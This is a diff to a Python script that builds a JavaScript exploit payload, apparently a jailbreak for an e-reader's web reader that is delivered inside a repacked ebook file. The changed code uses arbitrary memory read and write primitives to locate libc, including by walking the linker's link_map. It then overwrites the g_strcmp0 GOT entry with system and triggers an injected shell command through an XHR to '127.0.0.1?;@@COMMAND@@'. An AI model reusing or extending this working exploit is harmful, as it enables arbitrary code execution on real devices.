@@ -87,26 +87,33 @@ var T=[];'''
 # pushed by the generated fragments between HELPERS and this one.
 #
 # Table T layout (flat): for each firmware build, in order:
-#   [e_entry, system, g_strcmp0_got, n, (got_slot, libc_offset) x n]
+#   [e_entry, system, g_strcmp0_got, got_lo, got_hi, base, n,
+#    (got_slot, libc_offset) x n]
 # The runner walks T looking for an entry whose e_entry matches the running
-# build, resolves libc via the candidates, forges g_strcmp0 -> system, and fires
-# the XHR. Status ends on "executing" (success) or an "abort:…"/"ERR:…" line.
+# build, resolves libc via the candidates, and — only if none resolve — falls
+# back to walking the dynamic linker's link_map by name. Then it forges
+# g_strcmp0 -> system and fires the XHR. Status ends on "executing" (success) or
+# an "abort:…"/"ERR:…" line.
 RUNNER_TMPL = r'''
 var LO=@@LIBC_LO@@,HI=@@LIBC_HI@@;
+function rd32(a){var v=rd64(a);return v[2]==="ok"?(v[0]>>>0):0xffffffff;}
+function find_lmhead(minc,glo,ghi){for(var a=(minc-4)>>>0;a>=glo;a-=4){var p=rd32(a);if(p===0xffffffff||p>=0xffff0000||p<ghi||(p&3)!==0)continue;if(rd32(p)!==0)continue;var ld=rd32((p+8)>>>0);if(ld<glo||ld>=ghi)continue;var dt=rd32(ld);if(dt===0xffffffff||dt>=0x40)continue;S("head=0x"+p.toString(16));return p;}S("no-head");return 0;}
+function find_libc(head){var lm=head;for(var k=0;k<64;k++){var name=rd32((lm+4)>>>0);if(!(name===0xffffffff||name===0||name>=0xffff0000)){var v=rd64(name);if(v[2]==="ok"&&v[0]===0x62696c2f&&v[1]===0x62696c2f){var v2=rd64((name+8)>>>0);if(v2[2]==="ok"&&(v2[0]&0xff)===0x63){S("libc=0x"+rd32(lm).toString(16));return rd32(lm);}}}lm=rd32((lm+12)>>>0);if(lm===0){S("c1");return 0;}}S("c2");return 0;}
 function run(){try{
 S("alive");
 var base=(rd64(0x10000)[0]===0x464c457f)?0x10000:0x8000;
 var ee=rd64(base+0x18)[0];
 S("ee=0x"+ee.toString(16));
-var libc=0,p=0,sys,gg,n,i,v,b;
+var libc=0,p=0,sys,gg,glo,ghi,wb,n,i,v,b,minc;
 while(p<T.length&&!libc){
- if(T[p]!==ee){p+=4+2*T[p+3];continue;}
- sys=T[p+1];gg=T[p+2];n=T[p+3];
- for(i=0;i<n&&!libc;i++){v=rd64(T[p+4+2*i]);if(v[2]==="ok"){b=(v[0]-T[p+5+2*i])>>>0;if((b&0xFFF)===0&&b>LO&&b<HI)libc=b>>>0;}}
- if(libc){var system=(libc+sys)>>>0;S("libc=0x"+libc.toString(16));var vc=rd64(gg);if(vc[2]!=="ok"){S("abort:g_read");return;}S("forge:"+wr64(gg,system,vc[1]));var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1?;@@COMMAND@@",false);try{x.send(null);}catch(e){}S("executing");}
- p+=4+2*n;
+ if(T[p]!==ee){p+=7+2*T[p+6];continue;}
+ sys=T[p+1];gg=T[p+2];glo=T[p+3];ghi=T[p+4];wb=T[p+5];n=T[p+6];minc=T[p+7];
+ for(i=0;i<n&&!libc;i++){v=rd64(T[p+7+2*i]);if(v[2]==="ok"){b=(v[0]-T[p+8+2*i])>>>0;if((b&0xFFF)===0&&b>LO&&b<HI)libc=b>>>0;}}
+ p+=7+2*n;
 }
-if(!libc)S("abort:no-firm");
+if(!libc){S("linkmap");var h=find_lmhead(minc,glo,ghi);if(h){libc=find_libc(h);if(libc)S("lm-libc=0x"+libc.toString(16));}else{S("no-lmhead");}}
+if(libc){var system=(libc+sys)>>>0;S("libc=0x"+libc.toString(16));var vc=rd64(gg);if(vc[2]!=="ok"){S("abort:g_read");return;}S("forge:"+wr64(gg,system,vc[1]));var x=new XMLHttpRequest();x.open("GET","http://127.0.0.1?;@@COMMAND@@",false);try{x.send(null);}catch(e){}S("executing");}
+if(!libc)S("no-firm ee=0x"+ee.toString(16));
 }catch(e){S("ERR:"+(e&&e.name?e.name:e))}}
 run();'''
 
@@ -179,6 +186,9 @@ def build_table(groups):
             table.append(f"0x{ee:x}")
             table.append(d["system"])
             table.append(d["g_strcmp0_got"])
+            table.append(d["webreader_got_lo"])
+            table.append(d["webreader_got_hi"])
+            table.append(d["webreader_base"])
             table.append(str(len(cands)))
             for got, off in cands:
                 table.append(got)
@@ -319,8 +329,14 @@ def _rekey(src, dst, asin, title, author):
     for _ in range(nrec):
         q += struct.unpack(">I", r0[q + 4:q + 8])[0]
     r0[q:q] = new
+    # Count the records actually appended to `new` (fixes the nrec+4 off-by-one).
+    n_new = 0
+    p = 0
+    while p + 8 <= len(new):
+        p += struct.unpack(">I", new[p + 4:p + 8])[0]
+        n_new += 1
     struct.pack_into(">I", r0, ex + 4, hdr_len + len(new))
-    struct.pack_into(">I", r0, ex + 8, nrec + 4)
+    struct.pack_into(">I", r0, ex + 8, nrec + n_new)
 
     # Rebuild the PDB record table (record 0 grew).
     body_start = 78 + n * 8 + 2
